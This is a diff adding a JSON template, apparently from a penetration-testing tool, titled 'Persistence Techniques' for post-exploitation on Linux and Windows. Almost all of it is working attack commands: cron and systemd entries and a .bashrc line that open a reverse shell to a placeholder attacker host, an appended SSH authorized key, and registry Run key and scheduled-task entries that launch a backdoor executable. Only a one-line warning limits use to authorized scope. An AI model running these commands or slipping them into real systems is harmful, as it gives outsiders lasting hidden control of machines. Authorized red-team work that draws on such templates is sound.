@@ -1,0 +1,9 @@
+{
+  "name": "Persistence Techniques",
+  "description": "System persistence techniques",
+  "category": "post",
+  "variables": [
+    "os:linux"
+  ],
+  "content": "Configure persistence on the system ({os:linux}).\n\n**Linux :**\n```bash\n# Cron job\necho '* * * * * /tmp/shell.sh' | crontab -\n\n# Systemd service\ncat > /etc/systemd/system/backdoor.service << EOF\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF\n\n# SSH authorized_keys\necho 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys\n\n# bashrc\necho 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1 &' >> ~/.bashrc\n```\n\n**Windows :**\n```powershell\n# Registry Run key\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d \"C:\\backdoor.exe\"\n\n# Scheduled Task\nschtasks /create /tn \"Updater\" /tr \"C:\\backdoor.exe\" /sc onlogon\n\n# WMI subscription\n```\n\n⚠️ Use only within the authorized scope."
+}
